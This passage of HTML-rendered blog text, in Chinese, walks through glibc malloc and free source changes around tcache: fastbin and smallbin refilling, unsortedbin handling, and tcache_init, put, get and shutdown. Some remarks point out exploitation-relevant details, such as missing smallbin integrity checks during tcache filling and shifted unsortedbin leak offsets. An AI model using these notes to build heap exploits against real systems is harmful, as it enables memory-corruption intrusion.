class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();                            <span class="comment">// 优先判断tcache是否初始化</span></span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>在_libc_malloc中添加了tcache操作,可以直接在_libc_malloc获得chunk返回</strong></p><p>并且多了SINGLE_THREAD_P的判断分支</p><h3 id="int-malloc-1"><a href="#int-malloc-1" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><h4 id="fastbin-1"><a href="#fastbin-1" class="headerlink" title="fastbin"></a>fastbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line"><span class="meta">  do\</span></span><br><span class="line"><span class="meta">    &#123;\</span></span><br><span class="line"><span class="meta">      victim = pp;\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">    &#125;\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span></span><br><span class="line"><span class="meta"> != victim);\</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>fastbin取出发生较大变化</p><ol><li>之前的fastbin移除操作,现在分为两种情况<ul><li>如果是SINGLE_THREAD_P模式,直接*fb = victim-&gt;fd;最简单的单链表移除</li><li>之前的常规fastbin移除操作,现在采取REMOVE_FB宏来表示</li></ul></li><li>新增fastbin填充tcache机制,当从fastbin中取出chunk后,如果该fastbin中还有剩余chunk,且对应tcache中有剩余空间,则会将fastbin中的chunk移入tcachebin</li></ol><h4 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">-          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">-            malloc_consolidate (av);</span><br></pre></td></tr></table></figure><p><strong>去除</strong>bins未初始化则触发malloc_consolidate的机制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>smallbin同样新增tcache填充机制,当从smallbin中取出chunk后,如果该smallbinbin中还有剩余chunk,且对应tcache中有剩余空间,则会将smallbin中的chunk移入tcachebin</p><p><strong>注意</strong>填充过程中是没有对smallbin的完整性进行检查的</p><h4 id="大循环-1"><a href="#大循环-1" class="headerlink" title="大循环"></a>大循环</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="type">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>增加了一些参数的布置</p><h4 id="unsortedbin遍历"><a href="#unsortedbin遍历" class="headerlink" title="unsortedbin遍历"></a>unsortedbin遍历</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment"> We may return one of these chunks later.  */</span></span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>如果在遍历时,找到了刚好满足需求的chunk-A时,如果对应tcache中有剩余空间,则将A先放入tcache,如果没有剩余空间则直接返回A</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment"> filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>每一次unsorted遍历结束后,都会判断是否已经有找到满足需求的chunk,如果有且满足:</p><p>mp<em>.tcache_unsorted_limit大于0,且unsorted已遍历次数大于mp\</em>.tcache_unsorted_limit</p><p>则会直接从tcache中取出chunk中断unsorted遍历并返回</p><p>在调试时发现一般情况下<strong>mp_.tcache_unsorted_limit==0</strong>,也就是上述情况不满足,使得unsorted遍历会正常完成</p><p>然后直到unsorted遍历<strong>完成后</strong>,才会判断是否有找到满足需求的chunk,并从tcache返回</p><h2 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>__libc_free中并没有实质性的变化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAYBE_INIT_TCACHE()</span><br></pre></td></tr></table></figure><p>新增判断tcache是否初始化</p><h3 id="int-free-1"><a href="#int-free-1" class="headerlink" title="__int_free"></a>__int_free</h3><h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>释放时<strong><u>优先放入tcachebin</u></strong>,</p><p><strong>优先度高于各种合并</strong>(包括与top_chunk合并)</p><hr><h4 id="fastbin-2"><a href="#fastbin-2" class="headerlink" title="fastbin"></a>fastbin</h4><p>fastbin放入的操作发生了与malloc时类似的变化</p><h2 id="附属-1"><a href="#附属-1" class="headerlink" title="附属"></a>附属</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line"><span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line"><span class="type">int</span> have_fastchunks;</span><br></pre></td></tr></table></figure><p>这样的话unsortedbin泄露地址偏移就需要进行一定调整了,虽然是int类型但因为对齐要求占用了8字节</p><h3 id="malloc-consolidate-1"><a href="#malloc-consolidate-1" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增判断fastbin取出的chunk的大小是否符合当前fastbin链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;  </span><br><span class="line">    ........</span><br><span class="line">    ........</span><br><span class="line">- &#125;</span><br><span class="line">-   <span class="keyword">else</span> &#123;</span><br><span class="line">-     malloc_init_state(av);</span><br><span class="line">-     check_malloc_state(av);</span><br><span class="line">-   &#125;</span><br></pre></td></tr></table></figure><p>去除了一些操作</p><h3 id="tcache-1"><a href="#tcache-1" class="headerlink" title="tcache"></a>tcache</h3><h4 id="tcache结构"><a href="#tcache结构" class="headerlink" title="tcache结构"></a>tcache结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//# define TCACHE_MAX_BINS64</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br></pre></td></tr></table></figure><p><strong>注意:</strong>tcache_entry的next字段指向的是chunk的mem区域,而非malloc_chunk头</p><h4 id="MAYBE-INIT-TCACHE"><a href="#MAYBE-INIT-TCACHE" class="headerlink" title="MAYBE_INIT_TCACHE()"></a>MAYBE_INIT_TCACHE()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span></span><br><span class="line"><span class="meta">    tcache_init();</span></span><br></pre></td></tr></table></figure><p>判断是否初始化tcache</p><h4 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init"></a>tcache_init</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)<span class="comment">//不适用tcache</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;<span class="comment">//将tcache_perthread_struct的地址赋值给tcache</span></span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>首先在堆上分配<strong>sizeof (tcache_perthread_struct)+0x10</strong>的chunk,大小一般是64*8+64*2+0x10=<strong>0x290</strong>即每一个counts两个字节(也有可能是64*8+64+0x10=0x250,即每一个counts一个字节,不记得有没有遇到过)</li><li>将其中的<strong>内存全部置零</strong></li></ol><h4 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-shutdown"><a href="#tcache-shutdown" class="headerlink" title="tcache_shutdown"></a>tcache_shutdown</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>;</span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">  tcache_tmp-&gt;entries[i] = e-&gt;next;</span><br><span class="line">  __libc_free (e);</span><br><span 